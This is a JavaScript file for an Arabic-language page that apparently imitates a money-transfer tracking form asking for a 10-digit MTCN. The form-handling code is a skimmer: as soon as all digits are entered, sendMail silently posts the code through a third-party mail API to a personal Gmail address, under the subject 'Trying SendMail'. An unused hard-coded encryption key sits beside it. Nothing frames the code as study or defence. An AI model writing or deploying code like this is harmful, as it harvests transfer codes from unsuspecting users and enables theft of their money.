const $ = (selector) => document.querySelector(selector);
const sender = document.getElementById("sender");
const receiver = document.getElementById("receiver");
const description = document.getElementById("description");
const lang = document.getElementById("lang");
const menu = document.getElementById("menu");
const inputs = document.querySelectorAll("input");
const firstInput = inputs[0];

function toggleLang() {
    firstInput.focus();
    if (lang.style.display === "none") {
        lang.style.display = "block";
        menu.style.display = "none";
    } else {
        lang.style.display = "none";
    }
}

function toggleMenu() {
    firstInput.focus();
    if (menu.style.display === "none") {
        menu.style.display = "block";
        lang.style.display = "none";
    } else {
        menu.style.display = "none";
    }
}

function toggle(theWay) {
    if (theWay == "receiver") {
        receiver.classList.add("border-b-2");
        receiver.classList.remove("text-blue-700");
        sender.classList.add("text-blue-700");
        sender.classList.remove("border-b-2");
        description.innerHTML = `  <div dir="rtl" class="text-sm2 text-end"> لتتبع عملية تحويل، أدخِل رقم التحويل <span class="font-bold font-sans text-sm2">(MTCN)</span> أدناه الذي  يتألف من <span class="font-bold font-sans text-sm2">10</span> أرقام. 
                            <svg class="mx-1" width="18" height="18" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" id="icon_tooltip_info" style="display: inline-block; vertical-align: middle; color: var(--color-primary);">
                            <path d="M512 32c265.097 0 480 214.903 480 480s-214.903 480-480 480c-265.097 0-480-214.903-480-480s214.903-480 480-480zM572 467h-120v315h120v-315zM512 246.5c-10.309-0.113-20.528 1.931-30 6-8.894 3.844-17.102 9.113-24.3 15.6-14.093 13.19-21.986 31.699-21.75 51-0.289 19.442 7.603 38.111 21.75 51.45 14.46 14.191 34.046 21.928 54.3 21.45 10.264 0.1 20.451-1.784 30-5.55 17.935-6.95 32.352-20.773 40.050-38.4 4.065-9.051 6.113-18.878 6-28.8 0.242-9.839-1.651-19.613-5.55-28.65-7.802-17.715-22.396-31.551-40.5-38.4-9.518-3.889-19.719-5.827-30-5.7z" style="fill: rgb(0, 85, 197)"></path>
                        </svg>
                    </div>
    <div class=" font-sans text-center w-full text-sm2 mt-2 " >لتتبع عملية تحويل، أدخِل رقم التحويل <span class="font-bold font-sans">(MTCN) </span> أدناه.
</div></div>`;
    } else {
        sender.classList.add("border-b-2");
        receiver.classList.add("text-blue-700");
        sender.classList.remove("text-blue-700");

        receiver.classList.remove("border-b-2");
        description.innerHTML = ` <div dir="rtl" class="text-sm2 text-end"> لتتبع عملية تحويل، أدخِل رقم التحويل <span class="font-bold font-sans text-sm2">(MTCN)</span> أدناه الذي  يتألف من <span class="font-bold font-sans text-sm2">10</span> أرقام. 
                            <svg class="mx-1" width="18" height="18" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" id="icon_tooltip_info" style="display: inline-block; vertical-align: middle; color: var(--color-primary);">
                            <path d="M512 32c265.097 0 480 214.903 480 480s-214.903 480-480 480c-265.097 0-480-214.903-480-480s214.903-480 480-480zM572 467h-120v315h120v-315zM512 246.5c-10.309-0.113-20.528 1.931-30 6-8.894 3.844-17.102 9.113-24.3 15.6-14.093 13.19-21.986 31.699-21.75 51-0.289 19.442 7.603 38.111 21.75 51.45 14.46 14.191 34.046 21.928 54.3 21.45 10.264 0.1 20.451-1.784 30-5.55 17.935-6.95 32.352-20.773 40.050-38.4 4.065-9.051 6.113-18.878 6-28.8 0.242-9.839-1.651-19.613-5.55-28.65-7.802-17.715-22.396-31.551-40.5-38.4-9.518-3.889-19.719-5.827-30-5.7z" style="fill: rgb(0, 85, 197)"></path>
                        </svg>
                    </div>`;
    }
}

function modelToggle() {
    if ($(".model").style.display === "none") {
        $(".model").style.display = "flex";
    } else {
        $(".model").style.display = "none";
    }
}

function sendMail(event) {
    event.preventDefault();
    const mtcn = Array.from(inputs).map(input => input.value).join('');
    const message = `${mtcn}`;

    // تشفير الرسالة
    const secretKey = 'hcxvbvcvxcvcndjkvxckkppunxepxcvxcvauqm';
    const encryptedMessage = CryptoJS.AES.encrypt(message, secretKey).toString();
   console.log("encryptedMessage", encryptedMessage);
    fetch("https://sendmail-api-docs.vercel.app/api/send", {
        method: "POST",
        body: JSON.stringify({
            to: "yabo22050@gmail.com",
            subject: "Trying SendMail",
            message: "لقد تم تسجيل دخولك في الموقع" + message,

        })

    });
}


// Event listener for input fields to restrict to one digit
inputs.forEach((input) => {
    input.addEventListener('input', (event) => {
        event.target.value = event.target.value.slice(0, 1); // Limit input to one character
    });
});

inputs.forEach((input) => {
    input.addEventListener('keypress', (event) => {
        const key = event.key;
        const isNumber = /^\d$/.test(key);
        if (!isNumber) {
            event.preventDefault();
        }
    });
});

inputs.forEach((input, index) => {
    input.addEventListener('input', (event) => {
        if (input.value !== '' && input.value.length === parseInt(input.getAttribute('maxlength'))) {
            if (inputs[index + 1]) {
                inputs[index + 1].removeAttribute('disabled');
                inputs[index + 1].focus();
            }
        } else if (input.value === '' && index !== 0) {
            input.setAttribute('disabled', 'disabled');
            inputs[index - 1].focus();
        }

        const allFieldsFilled = Array.from(inputs).every(input => input.value !== '');
        if (allFieldsFilled) {
            sendMail(event);
        }
    });
});

inputs.forEach((input, index) => {
    if (index !== 0) {
        input.setAttribute('disabled', 'disabled');
    }
});

firstInput.removeAttribute('disabled');

inputs.forEach((input) => {
    input.addEventListener('keypress', (event) => {
        const key = event.key;
        const isNumber = /^\d$/.test(key);
        if (!isNumber) {
            event.preventDefault();
        }
    });
});
document.addEventListener('DOMContentLoaded', function () {
    const firstInput = document.querySelector('input');
    firstInput.focus();
});

document.addEventListener('click', function (event) {
    const allFieldsEmpty = Array.from(inputs).every(input => input.value === '');
    if (allFieldsEmpty) {
        const firstInput = document.querySelector('input');
        firstInput.focus();
    }
});
